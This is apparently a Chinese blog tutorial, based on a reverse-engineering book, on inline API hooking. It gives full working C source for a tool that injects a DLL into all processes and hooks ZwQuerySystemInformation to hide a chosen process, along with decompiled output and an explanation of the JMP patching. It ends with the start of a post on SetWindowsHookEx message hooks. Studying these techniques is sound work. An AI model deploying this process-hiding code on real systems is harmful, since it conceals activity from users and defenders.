Vista&#x2F;7中使用了会话隔离技术，这可能导致DLL注入失败。出现这个问题，不要使用kernel32.CreateRemoteThread()，而使用ntdll.NtCreateThreadEx()就可以了。\n123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209#include &quot;windows.h&quot;#include &quot;stdio.h&quot;#include &quot;tlhelp32.h&quot;#include &quot;tchar.h&quot;typedef void (*PFN_SetProcName)(LPCTSTR szProcName);enum &#123;INJECTION_MODE = 0, EJECTION_MODE&#125;;BOOL SetPrivilege(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege) &#123;    TOKEN_PRIVILEGES tp;    HANDLE hToken;    LUID luid;    if( !OpenProcessToken(GetCurrentProcess(),                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, \t\t\t              &amp;hToken) )    &#123;        printf(&quot;OpenProcessToken error: %u\\n&quot;, GetLastError());        return FALSE;    &#125;    if( !LookupPrivilegeValue(NULL,            // lookup privilege on local system                              lpszPrivilege,   // privilege to lookup                               &amp;luid) )        // receives LUID of privilege    &#123;        printf(&quot;LookupPrivilegeValue error: %u\\n&quot;, GetLastError() );         return FALSE;     &#125;    tp.PrivilegeCount = 1;    tp.Privileges[0].Luid = luid;    if( bEnablePrivilege )        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;    else        tp.Privileges[0].Attributes = 0;    // Enable the privilege or disable all privileges.    if( !AdjustTokenPrivileges(hToken,                                FALSE,                                &amp;tp,                                sizeof(TOKEN_PRIVILEGES),                                (PTOKEN_PRIVILEGES) NULL,                                (PDWORD) NULL) )    &#123;         printf(&quot;AdjustTokenPrivileges error: %u\\n&quot;, GetLastError() );         return FALSE;     &#125;     if( GetLastError() == ERROR_NOT_ALL_ASSIGNED )    &#123;        printf(&quot;The token does not have the specified privilege. \\n&quot;);        return FALSE;    &#125;     return TRUE;&#125;BOOL InjectDll(DWORD dwPID, LPCTSTR szDllPath)&#123;\tHANDLE                  hProcess, hThread;\tLPVOID                  pRemoteBuf;\tDWORD                   dwBufSize = (DWORD)(_tcslen(szDllPath) + 1) * sizeof(TCHAR);\tLPTHREAD_START_ROUTINE  pThreadProc;\tif ( !(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID)) )    &#123;        printf(&quot;OpenProcess(%d) failed!!!\\n&quot;, dwPID);\t\treturn FALSE;    &#125;\tpRemoteBuf = VirtualAllocEx(hProcess, NULL, dwBufSize,                                 MEM_COMMIT, PAGE_READWRITE);\tWriteProcessMemory(hProcess, pRemoteBuf,                        (LPVOID)szDllPath, dwBufSize, NULL);\tpThreadProc = (LPTHREAD_START_ROUTINE)                  GetProcAddress(GetModuleHandle(L&quot;kernel32.dll&quot;),                                  &quot;LoadLibraryW&quot;);\thThread = CreateRemoteThread(hProcess, NULL, 0,                                  pThreadProc, pRemoteBuf, 0, NULL);\tWaitForSingleObject(hThread, INFINITE);\t\tVirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);\tCloseHandle(hThread);\tCloseHandle(hProcess);\treturn TRUE;&#125;BOOL EjectDll(DWORD dwPID, LPCTSTR szDllPath)&#123;\tBOOL                    bMore = FALSE, bFound = FALSE;\tHANDLE                  hSnapshot, hProcess, hThread;\tMODULEENTRY32           me = &#123; sizeof(me) &#125;;\tLPTHREAD_START_ROUTINE  pThreadProc;\tif( INVALID_HANDLE_VALUE ==         (hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, dwPID)) )\t\treturn FALSE;\tbMore = Module32First(hSnapshot, &amp;me);\tfor( ; bMore ; bMore = Module32Next(hSnapshot, &amp;me) )\t&#123;\t\tif( !_tcsicmp(me.szModule, szDllPath) ||             !_tcsicmp(me.szExePath, szDllPath) )\t\t&#123;\t\t\tbFound = TRUE;\t\t\tbreak;\t\t&#125;\t&#125;\tif( !bFound )\t&#123;\t\tCloseHandle(hSnapshot);\t\treturn FALSE;\t&#125;\tif( !(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID)) )\t&#123;\t\tCloseHandle(hSnapshot);\t\treturn FALSE;\t&#125;\tpThreadProc = (LPTHREAD_START_ROUTINE)                  GetProcAddress(GetModuleHandle(L&quot;kernel32.dll&quot;),                                  &quot;FreeLibrary&quot;);\thThread = CreateRemoteThread(hProcess, NULL, 0,                                  pThreadProc, me.modBaseAddr, 0, NULL);\tWaitForSingleObject(hThread, INFINITE);\t\tCloseHandle(hThread);\tCloseHandle(hProcess);\tCloseHandle(hSnapshot);\treturn TRUE;&#125;BOOL InjectAllProcess(int nMode, LPCTSTR szDllPath)&#123;\tDWORD                   dwPID = 0;\tHANDLE                  hSnapShot = INVALID_HANDLE_VALUE;\tPROCESSENTRY32          pe;\t//获取系统快照\tpe.dwSize = sizeof( PROCESSENTRY32 );\thSnapShot = CreateToolhelp32Snapshot( TH32CS_SNAPALL, NULL );\t//查找进程\tProcess32First(hSnapShot, &amp;pe);\tdo\t&#123;\t\tdwPID = pe.th32ProcessID;\t\t//鉴于系统安全性的考虑\t\t//对于PID小于100的系统进程不执行DLL注入操作\t\tif( dwPID &lt; 100 )\t\t\tcontinue;        if( nMode == INJECTION_MODE )\t\t    InjectDll(dwPID, szDllPath);        else            EjectDll(dwPID, szDllPath);\t&#125;\twhile( Process32Next(hSnapShot, &amp;pe) );\tCloseHandle(hSnapShot);\treturn TRUE;&#125;int _tmain(int argc, TCHAR* argv[])&#123;    int                     nMode = INJECTION_MODE;    HMODULE                 hLib = NULL;    PFN_SetProcName         SetProcName = NULL;\tif( argc != 4 )\t&#123;\t\tprintf(&quot;\\n Usage  : HideProc.exe &lt;-hide|-show&gt; &quot;\\               &quot;&lt;process name&gt; &lt;dll path&gt;\\n\\n&quot;);\t\treturn 1;\t&#125;\t// change privilege\t//只有先提升权限，才能准确获取所有进程的列表\t//内部调用AdjustTokenPrivileges来提权    SetPrivilege(SE_DEBUG_NAME, TRUE);    // load library    hLib = LoadLibrary(argv[3]);    // set process name to hide    SetProcName = (PFN_SetProcName)GetProcAddress(hLib, &quot;SetProcName&quot;);    SetProcName(argv[2]);    // Inject(Eject) Dll to all process    if( !_tcsicmp(argv[1], L&quot;-show&quot;) )\t    nMode = EJECTION_MODE;    InjectAllProcess(nMode, argv[3]);    // free library    FreeLibrary(hLib);\treturn 0;&#125;\n\n首先使用 SetPrivilege提升权限，以便获取系统所有进程列表\n接着调用InjectAllProcess，其内部使用CreateToolhelp32Snapshot获取系统中运行的所有进程列表，然后使用Process32First和Process32Next将获取的进程信息存放到PROCESSENTRY32结构体变量pe中，进而获取进程的PID，然后调用InjectDll来注入DLL\n12345678910111213141516171819202122232425262728293031typedef struct tagPROCESSENTRY32W&#123;    DWORD   dwSize;    DWORD   cntUsage;    DWORD   th32ProcessID;          // this process    ULONG_PTR th32DefaultHeapID;    DWORD   th32ModuleID;           // associated exe    DWORD   cntThreads;    DWORD   th32ParentProcessID;    // this process&#x27;s parent process    LONG    pcPriClassBase;         // Base priority of process&#x27;s threads    DWORD   dwFlags;    WCHAR   szExeFile[MAX_PATH];    // Path&#125; PROCESSENTRY32W;typedef PROCESSENTRY32W *  PPROCESSENTRY32W;typedef PROCESSENTRY32W *  LPPROCESSENTRY32W;HANDLE WINAPI CreateToolhelp32Snapshot(    DWORD dwFlags,    DWORD th32ProcessID);BOOL WINAPI Process32FirstW(    HANDLE hSnapshot,    LPPROCESSENTRY32W lppe);BOOL WINAPI Process32NextW(    HANDLE hSnapshot,    LPPROCESSENTRY32W lppe);\n\n\n\nstealth.cpp源码分析实际的API钩取操作由stealth.dll文件复制\n123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227#include &quot;windows.h&quot;#include &quot;tchar.h&quot;#define STATUS_SUCCESS\t\t\t\t\t\t(0x00000000L) typedef LONG NTSTATUS;typedef enum _SYSTEM_INFORMATION_CLASS &#123;    SystemBasicInformation = 0,    SystemPerformanceInformation = 2,    SystemTimeOfDayInformation = 3,    SystemProcessInformation = 5,    SystemProcessorPerformanceInformation = 8,    SystemInterruptInformation = 23,    SystemExceptionInformation = 33,    SystemRegistryQuotaInformation = 37,    SystemLookasideInformation = 45&#125; SYSTEM_INFORMATION_CLASS;typedef struct _SYSTEM_PROCESS_INFORMATION &#123;    ULONG NextEntryOffset;    ULONG NumberOfThreads;    BYTE Reserved1[48];    PVOID Reserved2[3];    HANDLE UniqueProcessId;    PVOID Reserved3;    ULONG HandleCount;    BYTE Reserved4[4];    PVOID Reserved5[11];    SIZE_T PeakPagefileUsage;    SIZE_T PrivatePageCount;    LARGE_INTEGER Reserved6[6];&#125; SYSTEM_PROCESS_INFORMATION, *PSYSTEM_PROCESS_INFORMATION;typedef NTSTATUS (WINAPI *PFZWQUERYSYSTEMINFORMATION)                 (SYSTEM_INFORMATION_CLASS SystemInformationClass,                   PVOID SystemInformation,                   ULONG SystemInformationLength,                   PULONG ReturnLength);#define DEF_NTDLL                       (&quot;ntdll.dll&quot;)#define DEF_ZWQUERYSYSTEMINFORMATION    (&quot;ZwQuerySystemInformation&quot;)// global variable (in sharing memory)#pragma comment(linker, &quot;/SECTION:.SHARE,RWS&quot;)#pragma data_seg(&quot;.SHARE&quot;)    TCHAR g_szProcName[MAX_PATH] = &#123;0,&#125;;#pragma data_seg()// global variableBYTE g_pOrgBytes[5] = &#123;0,&#125;;BOOL hook_by_code(LPCSTR szDllName, LPCSTR szFuncName, PROC pfnNew, PBYTE pOrgBytes)&#123;    FARPROC pfnOrg;    DWORD dwOldProtect, dwAddress;    BYTE pBuf[5] = &#123;0xE9, 0, &#125;;    PBYTE pByte;    // 获取要钩取的API地址    pfnOrg = (FARPROC)GetProcAddress(GetModuleHandleA(szDllName), szFuncName);    pByte = (PBYTE)pfnOrg;    // 若已经被钩取则return FALSE    if( pByte[0] == 0xE9 )        return FALSE;    //为了修改5个字节，先向内存添加写属性    VirtualProtect((LPVOID)pfnOrg, 5, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);    //备份原有代码(5字节)    memcpy(pOrgBytes, pfnOrg, 5);    //计算JMP地址(E9 XXXXXXXX)    // =&gt; XXXXXXXX = pfnNew - pfnOrg - 5    dwAddress = (DWORD)pfnNew - (DWORD)pfnOrg - 5;    memcpy(&amp;pBuf[1], &amp;dwAddress, 4);    // Hook - 修改5个字节(JMP XXXXXXXX)    memcpy(pfnOrg, pBuf, 5);    //恢复内存属性    VirtualProtect((LPVOID)pfnOrg, 5, dwOldProtect, &amp;dwOldProtect);        return TRUE;&#125;BOOL unhook_by_code(LPCSTR szDllName, LPCSTR szFuncName, PBYTE pOrgBytes)&#123;    FARPROC pFunc;    DWORD dwOldProtect;    PBYTE pByte;    //获取API地址    pFunc = GetProcAddress(GetModuleHandleA(szDllName), szFuncName);    pByte = (PBYTE)pFunc;    //若已经脱钩则return FALSE    if( pByte[0] != 0xE9 )        return FALSE;    // 向内存添加写属性，为恢复原代码（5个字节）准备    VirtualProtect((LPVOID)pFunc, 5, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);    // Unhook    memcpy(pFunc, pOrgBytes, 5);    //恢复内存属性    VirtualProtect((LPVOID)pFunc, 5, dwOldProtect, &amp;dwOldProtect);    return TRUE;&#125;NTSTATUS WINAPI NewZwQuerySystemInformation(                SYSTEM_INFORMATION_CLASS SystemInformationClass,                 PVOID SystemInformation,                 ULONG SystemInformationLength,                 PULONG ReturnLength)&#123;    NTSTATUS status;    FARPROC pFunc;    PSYSTEM_PROCESS_INFORMATION pCur, pPrev;    char szProcName[MAX_PATH] = &#123;0,&#125;;        //开始前先脱钩    unhook_by_code(DEF_NTDLL, DEF_ZWQUERYSYSTEMINFORMATION, g_pOrgBytes);    //调用原始API    pFunc = GetProcAddress(GetModuleHandleA(DEF_NTDLL),                            DEF_ZWQUERYSYSTEMINFORMATION);    status = ((PFZWQUERYSYSTEMINFORMATION)pFunc)              (SystemInformationClass, SystemInformation,               SystemInformationLength, ReturnLength);    if( status != STATUS_SUCCESS )        goto __NTQUERYSYSTEMINFORMATION_END;    //仅针对SystemProcessInformation类型操作    if( SystemInformationClass == SystemProcessInformation )    &#123;        // SYSTEM_PROCESS_INFORMATION类型转换        // pCur是单项链表的头        pCur = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;        while(TRUE)        &#123;            // 比较进程名称            // g_szProcName为要隐藏的进程名            // (=&gt; 在SetProcName()中设置)            if(pCur-&gt;Reserved2[1] != NULL)            &#123;                if(!_tcsicmp((PWSTR)pCur-&gt;Reserved2[1], g_szProcName))                &#123;                    //从链表中删除隐藏进程的节点                    if(pCur-&gt;NextEntryOffset == 0)                        pPrev-&gt;NextEntryOffset = 0;                    else                        pPrev-&gt;NextEntryOffset += pCur-&gt;NextEntryOffset;                &#125;                else\t\t                    pPrev = pCur;            &#125;            if(pCur-&gt;NextEntryOffset == 0)                break;            //链表的下一项            pCur = (PSYSTEM_PROCESS_INFORMATION)                    ((ULONG)pCur + pCur-&gt;NextEntryOffset);        &#125;    &#125;__NTQUERYSYSTEMINFORMATION_END:    //函数终止前，再次执行API钩取操作，为下次调用准备    hook_by_code(DEF_NTDLL, DEF_ZWQUERYSYSTEMINFORMATION,                  (PROC)NewZwQuerySystemInformation, g_pOrgBytes);    return status;&#125;BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)&#123;    char            szCurProc[MAX_PATH] = &#123;0,&#125;;    char            *p = NULL;    // #1. 异常处理    // 若当前进程为HookProc.exe，则终止，不进行钩取操作    GetModuleFileNameA(NULL, szCurProc, MAX_PATH);    p = strrchr(szCurProc, &#x27;\\\\&#x27;);    if( (p != NULL) &amp;&amp; !_stricmp(p+1, &quot;HideProc.exe&quot;) )        return TRUE;    switch( fdwReason )    &#123;        // #2. API Hooking        case DLL_PROCESS_ATTACH :         hook_by_code(DEF_NTDLL, DEF_ZWQUERYSYSTEMINFORMATION,                      (PROC)NewZwQuerySystemInformation, g_pOrgBytes);        break;        // #3. API Unhooking         case DLL_PROCESS_DETACH :        unhook_by_code(DEF_NTDLL, DEF_ZWQUERYSYSTEMINFORMATION,                        g_pOrgBytes);        break;    &#125;    return TRUE;&#125;#ifdef __cplusplusextern &quot;C&quot; &#123;#endif__declspec(dllexport) void SetProcName(LPCTSTR szProcName)&#123;    _tcscpy_s(g_szProcName, szProcName);&#125;#ifdef __cplusplus&#125;#endif\n\nSetProcName()首先看导出函数SetProcName()\n123456789101112131415161718// global variable (in sharing memory)#pragma comment(linker, &quot;/SECTION:.SHARE,RWS&quot;)#pragma data_seg(&quot;.SHARE&quot;)    TCHAR g_szProcName[MAX_PATH] = &#123;0,&#125;;#pragma data_seg()......//export function#ifdef __cplusplusextern &quot;C&quot; &#123;#endif__declspec(dllexport) void SetProcName(LPCTSTR szProcName)&#123;    _tcscpy_s(g_szProcName, szProcName);&#125;#ifdef __cplusplus&#125;\n\n以上代码先创建名为”.SHARE”的共享内存节区，然后创建g_szProcName缓冲区，最后再由导出函数SetProcName()将要隐藏的进程名称保存到g_szProcName中（SetProcName函数在HideProc.exe中被调用执行）\n\n\n\n\n\n\n\n\n\n在共享内存节区创建g_szProcName缓冲区的好处在于，stealth.dll被注入所有进程时，可以彼此共享隐藏进程的名称（随着程序不断改进，甚至也可以做到动态修改隐藏进程）\nDllMain()1234567891011121314151617181920212223242526272829BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)&#123;    char            szCurProc[MAX_PATH] = &#123;0,&#125;;    char            *p = NULL;    // #1. 异常处理    // 若当前进程为HookProc.exe，则终止，不进行钩取操作    GetModuleFileNameA(NULL, szCurProc, MAX_PATH);    p = strrchr(szCurProc, &#x27;\\\\&#x27;);    if( (p != NULL) &amp;&amp; !_stricmp(p+1, &quot;HideProc.exe&quot;) )        return TRUE;    switch( fdwReason )    &#123;        // #2. API Hooking        case DLL_PROCESS_ATTACH :         hook_by_code(DEF_NTDLL, DEF_ZWQUERYSYSTEMINFORMATION,                      (PROC)NewZwQuerySystemInformation, g_pOrgBytes);        break;        // #3. API Unhooking         case DLL_PROCESS_DETACH :        unhook_by_code(DEF_NTDLL, DEF_ZWQUERYSYSTEMINFORMATION,                        g_pOrgBytes);        break;    &#125;    return TRUE;&#125;\n\nDllMain函数先比较字符串，若进程名为HookProc.exe，则进行异常处理，不钩取API。发生DLL_PROCESS_ATTACH事件时，调用hook_by_code函数钩取API；发生DLL_PROCESS_DETACH事件时，调用unhook_by_code函数取消API钩取。\nhook_by_code()该函数通过修改代码实现API钩取\n12345678910111213141516171819202122232425262728293031323334BOOL hook_by_code(LPCSTR szDllName, LPCSTR szFuncName, PROC pfnNew, PBYTE pOrgBytes)&#123;    FARPROC pfnOrg;    DWORD dwOldProtect, dwAddress;    BYTE pBuf[5] = &#123;0xE9, 0, &#125;;    PBYTE pByte;    // 获取要钩取的API地址    pfnOrg = (FARPROC)GetProcAddress(GetModuleHandleA(szDllName), szFuncName);    pByte = (PBYTE)pfnOrg;    // 若已经被钩取则return FALSE    if( pByte[0] == 0xE9 )        return FALSE;    //为了修改5个字节，先向内存添加写属性    VirtualProtect((LPVOID)pfnOrg, 5, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);    //备份原有代码(5字节)    memcpy(pOrgBytes, pfnOrg, 5);    //计算JMP地址(E9 XXXXXXXX)    // =&gt; XXXXXXXX = pfnNew - pfnOrg - 5    dwAddress = (DWORD)pfnNew - (DWORD)pfnOrg - 5;    memcpy(&amp;pBuf[1], &amp;dwAddress, 4);    // Hook - 修改5个字节(JMP XXXXXXXX)    memcpy(pfnOrg, pBuf, 5);    //恢复内存属性    VirtualProtect((LPVOID)pfnOrg, 5, dwOldProtect, &amp;dwOldProtect);        return TRUE;&#125;\n\nIDA反编译结果：\n12345678910111213141516171819202122int __cdecl sub_10001000(LPCSTR lpModuleName, LPCSTR lpProcName, int a3, int a4)&#123;  HMODULE ModuleHandleA; // eax  FARPROC ProcAddress; // esi  DWORD flOldProtect; // [esp+8h] [ebp-10h] BYREF  _DWORD v8[2]; // [esp+Ch] [ebp-Ch]  v8[0] = &#x27;\\xE9&#x27;;  LOBYTE(v8[1]) = 0;  ModuleHandleA = GetModuleHandleA(lpModuleName);  ProcAddress = GetProcAddress(ModuleHandleA, lpProcName);  if ( *(_BYTE *)ProcAddress == 0xE9 )    return 0;  VirtualProtect(ProcAddress, 5u, 0x40u, &amp;flOldProtect);  *(_DWORD *)a4 = *(_DWORD *)ProcAddress;  *(_BYTE *)(a4 + 4) = *((_BYTE *)ProcAddress + 4);  *(_DWORD *)((char *)v8 + 1) = a3 - (_DWORD)ProcAddress - 5;  *(_DWORD *)ProcAddress = v8[0];  *((_BYTE *)ProcAddress + 4) = (unsigned int)(a3 - (_DWORD)ProcAddress - 5) &gt;&gt; 24;  VirtualProtect(ProcAddress, 5u, flOldProtect, &amp;flOldProtect);  return 1;&#125;\n\nhook_by_code()函数参数介绍如下：\n1234567LPCSTR szDllName：[IN]包含要钩取的API的DLL文件的名称LPCSTR szFuncName：[IN]包含要钩取的API名称PROC pfnNew：[IN]用户提供的钩取函数地址PBYTE pOrgBytes：[OUT]存储原来5个字节的缓冲区，后面脱钩时使用\n\n该函数用于将原来API代码的前5个字节更改为”JMP XXXXXXXX”。\n根据Intel x86（IA-32）指令格式，JMP指令对应的操作码为E9，后面跟4个字节的地址。也就是说，JMP指令的Instruction实际形式为”E9 XXXXXXXX”。需要注意的是，XXXXXXXX地址值不是要跳转的绝对地址值，而是从当前JMP命令到跳转位置的相对距离。通过下列关系式求得XXXXXXXX的地址值：\n1XXXXXXXX=要跳转的地址-当前指令地址-当前指令长度（5）\n\n最后又减去5个字节是因为JMP指令本身长度就是5个字节。例如，当前JMP指令的地址为402000，若想跳转到401000地址处，写成”E9 00401000”是不对的，XXXXXXXX地址值要使用上面的等式换算才行。\nXXXXXXXX&#x3D;401000-402000-5&#x3D;FFFFFFFB\n所以JMP指令的Instruction为”E9 FFFFFFFB”\n\n\n\n\n\n\n\n\n\n除了JMP指令外，还有一种short JMP指令，它是用来进行短距离跳转的指令，对应的IA-32指令为”EB XX”（指令长度为2字节）。\n像上面这样每次使用JMP指令都要计算相对地址，显得不太方便。也可以使用其他指令直接用绝对地址跳转，但是这样的指令长度往往较为复杂。\n例（1）PUSH + RET\n68 00401000 PUSH 00401000\nC3 RETN\n例（2）MOV + JMP\nB8 00401000 MOV EAX,00401000\nFFE0 JMP EAX\nunhook_by_code()该函数用来取消钩取\n12345678910111213141516171819202122232425BOOL unhook_by_code(LPCSTR szDllName, LPCSTR szFuncName, PBYTE pOrgBytes)&#123;    FARPROC pFunc;    DWORD dwOldProtect;    PBYTE pByte;    //获取API地址    pFunc = GetProcAddress(GetModuleHandleA(szDllName), szFuncName);    pByte = (PBYTE)pFunc;    //若已经脱钩则return FALSE    if( pByte[0] != 0xE9 )        return FALSE;    // 向内存添加写属性，为恢复原代码（5个字节）准备    VirtualProtect((LPVOID)pFunc, 5, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);    // Unhook    memcpy(pFunc, pOrgBytes, 5);    //恢复内存属性    VirtualProtect((LPVOID)pFunc, 5, dwOldProtect, &amp;dwOldProtect);    return TRUE;&#125;\n\n脱钩的原理很简单，就是将函数代码开始的前5个字节恢复原值\nNewZwQuerySystemInformation()最后，分析钩取函数NewZwQuerySystemInformation()。在此之前，先看看ntdll.ZwQuerySystemInformation API\n12345678910111213141516171819202122NTSTATUS WINAPI ZwQuerySystemInformation(  _In_      SYSTEM_INFORMATION_CLASS SystemInformationClass,  _Inout_   PVOID                    SystemInformation,  _In_      ULONG                    SystemInformationLength,  _Out_opt_ PULONG                   ReturnLength);typedef struct _SYSTEM_PROCESS_INFORMATION &#123;    ULONG NextEntryOffset;    ULONG NumberOfThreads;    BYTE Reserved1[48];    PVOID Reserved2[3];    HANDLE UniqueProcessId;    PVOID Reserved3;    ULONG HandleCount;    BYTE Reserved4[4];    PVOID Reserved5[11];    SIZE_T PeakPagefileUsage;    SIZE_T PrivatePageCount;    LARGE_INTEGER Reserved6[6];&#125; SYSTEM_PROCESS_INFORMATION,*PSYSTEM_PROCESS_INFORMATION;\n\n将SystemInformationClass设置为5（SystemProcessInformation）后调用ZwQuerySystemInformation() API，SystemInformation参数中存储的是SYSTEM_PROCESS_INFORMATION结构体单项链表的起始地址。该结构体链表中存储着运行中的所有进程信息。所以隐藏进程前，先要查找与之对应的链表成员，然后断开其与链表的链接。\n下面是NewZwQuerySystemInformation()函数的实现\n12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667NTSTATUS WINAPI NewZwQuerySystemInformation(                SYSTEM_INFORMATION_CLASS SystemInformationClass,                 PVOID SystemInformation,                 ULONG SystemInformationLength,                 PULONG ReturnLength)&#123;    NTSTATUS status;    FARPROC pFunc;    PSYSTEM_PROCESS_INFORMATION pCur, pPrev;    char szProcName[MAX_PATH] = &#123;0,&#125;;        //开始前先脱钩    unhook_by_code(DEF_NTDLL, DEF_ZWQUERYSYSTEMINFORMATION, g_pOrgBytes);    //调用原始API    pFunc = GetProcAddress(GetModuleHandleA(DEF_NTDLL),                            DEF_ZWQUERYSYSTEMINFORMATION);    status = ((PFZWQUERYSYSTEMINFORMATION)pFunc)              (SystemInformationClass, SystemInformation,               SystemInformationLength, ReturnLength);    if( status != STATUS_SUCCESS )        goto __NTQUERYSYSTEMINFORMATION_END;    //仅针对SystemProcessInformation类型操作    if( SystemInformationClass == SystemProcessInformation )    &#123;        // SYSTEM_PROCESS_INFORMATION类型转换        // pCur是单项链表的头        pCur = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;        while(TRUE)        &#123;            // 比较进程名称            // g_szProcName为要隐藏的进程名            // (=&gt; 在SetProcName()中设置)            if(pCur-&gt;Reserved2[1] != NULL)            &#123;                if(!_tcsicmp((PWSTR)pCur-&gt;Reserved2[1], g_szProcName))                &#123;                    //从链表中删除隐藏进程的节点                    if(pCur-&gt;NextEntryOffset == 0)                        pPrev-&gt;NextEntryOffset = 0;                    else                        pPrev-&gt;NextEntryOffset += pCur-&gt;NextEntryOffset;                &#125;                else\t\t                    pPrev = pCur;            &#125;            if(pCur-&gt;NextEntryOffset == 0)                break;            //链表的下一项            pCur = (PSYSTEM_PROCESS_INFORMATION)                    ((ULONG)pCur + pCur-&gt;NextEntryOffset);        &#125;    &#125;__NTQUERYSYSTEMINFORMATION_END:    //函数终止前，再次执行API钩取操作，为下次调用准备    hook_by_code(DEF_NTDLL, DEF_ZWQUERYSYSTEMINFORMATION,                  (PROC)NewZwQuerySystemInformation, g_pOrgBytes);    return status;&#125;\n\nIDA反编译结果：\n1234567891011121314151617181920212223242526272829303132333435363738394041int __stdcall sub_10001120(int a1, int a2, int a3, int a4)&#123;  int v4; // esi  HMODULE ModuleHandleA; // eax  FARPROC ZwQuerySystemInformation; // eax  int v7; // ebp  _DWORD *v8; // edi  _DWORD *v10; // [esp+10h] [ebp-10Ch]  CHAR MultiByteStr[260]; // [esp+14h] [ebp-108h] BYREF  v4 = a2;  memset(MultiByteStr, 0, sizeof(MultiByteStr));  sub_100010C0(&quot;ntdll.dll&quot;, &quot;ZwQuerySystemInformation&quot;, (int)&amp;unk_1000AC60);  ModuleHandleA = GetModuleHandleA(&quot;ntdll.dll&quot;);  ZwQuerySystemInformation = GetProcAddress(ModuleHandleA, &quot;ZwQuerySystemInformation&quot;);  v7 = ((int (__stdcall *)(int, int, int, int))ZwQuerySystemInformation)(a1, a2, a3, a4);  if ( !v7 &amp;&amp; a1 == 5 )  &#123;    v8 = v10;    while ( 1 )    &#123;      WideCharToMultiByte(0, 0, *(LPCWCH *)(v4 + 60), -1, MultiByteStr, 260, 0, 0);      if ( !_stricmp(MultiByteStr, Destination) )      &#123;        if ( *(_DWORD *)v4 )          *v8 += *(_DWORD *)v4;        else          *v8 = 0;      &#125;      else      &#123;        v8 = (_DWORD *)v4;      &#125;      if ( !*(_DWORD *)v4 )        break;      v4 += *(_DWORD *)v4;    &#125;  &#125;  sub_10001000(&quot;ntdll.dll&quot;, &quot;ZwQuerySystemInformation&quot;, (int)sub_10001120, (int)&amp;unk_1000AC60);  return v7;&#125;\n\n对NewZwQuerySystemInformation函数的结构说明如下：\n\n脱钩ZwQuerySystemInformation函数\n调用ZwQuerySystemInformation函数\n检查SYSTEM_PROCESS_INFORMATION结构体链表，查找要隐藏的进程\n查找到要隐藏的进程后，从链表中删除\n再次钩取ZwQuerySystemInformation\n\nNewZwQuerySystemInformation函数代码中有一个while语句，它用来检查SYSTEM_PROCESS_INFORMATION结构体链表，比较进程名称（pCur-&gt;Reserved2[1]）。\n参考链接https://blog.csdn.net/junbopengpeng/article/details/28142669\n","slug":"inline-Hook","date":"2022-03-24T09:39:13.000Z","categories_index":"","tags_index":"hook技术,逆向工程核心原理,API hook","author_index":"0netry"},{"id":"f1607dee380ae8a16588d94dd0edba33","title":"消息Hook","content":"概念Windows操作系统向用户提供GUI，它以事件驱动方式工作。在操作系统中借助键盘、鼠标，选择菜单、按钮，以及移动鼠标、改变窗口大小与位置等都是事件。发生这样的事件时，OS会把事先定义好的消息发送给相应的应用程序，应用程序分析收到的信息后执行相应的动作。也就是说，敲击键盘时，消息会从OS移动到应用程序。所谓的消息钩子就是在此间偷看这些消息。\n先讲常规Windows消息流：\n\n发生键盘输入事件时，WM_KEYDOWN消息被添加到[OS message queue]\nOS判断哪个应用程序中发生了事件，然后从[OS message queue]取出消息，添加到相应应用程序的[application message queue]中\n应用程序（如记事本）监视自身的[application message queue]，发现新添加的WM_KEYDOWN消息后，调用相应的事件处理程序处理\n\n\n如上图所示，OS消息队列与应用程序消息队列之间存在一条钩链（Hook Chain），设置好键盘消息钩子之后，处于钩链中的键盘消息钩子会比应用程序先看到相应信息。在键盘消息钩子函数的内部，除了可以查看消息之外，还可以修改消息本身，而且还能对消息实施拦截，阻止消息传递。\nSetWindowsHookEx()定义使用SetWindowsHookEx() API可以轻松实现消息钩子，其定义如下：\n123456789101112131415HHOOK SetWindowsHookExA(  [in] int       idHook,                        //hook type  [in] HOOKPROC  lpfn,                          //hook procedure  [in] HINSTANCE hmod,                          //hook procedure所属的DLL句柄（Handle）  [in] DWORD     dwThreadId                     //想要挂钩的线程id);HHOOK SetWindowsHookExW(  [in] int       idHook,  [in] HOOKPROC  lpfn,  [in] HINSTANCE hmod,  [in] DWORD     dwThreadId);//参考：https://learn.microsoft.com/zh-cn/windows/win32/api/winuser/nf-winuser-setwindowshookexa\n\n钩子过程（hook procedure）是由操作系统调用的回调函数。安装消息钩子时，钩子过程需要存在于某个DLL内部，且该DLL的实例句柄即是hMod。\n\n\n\n\n\n\n\n\n\n若dwThreadId参数被设置为0，则安装的钩子为全局钩子，它会影响到运行中的（以及以后要运行的）所有进程。\n像这样，使用SetWindowsHookEx() 设置好消息钩子后，在某个进程中生成指定消息时，操作系统会将相关的DLL文件强制注入相应进程，然后调用注册的钩子过程。注入进程时用户几乎不需要做什么。\n参数[in] idHook要安装的挂钩过程的类型。 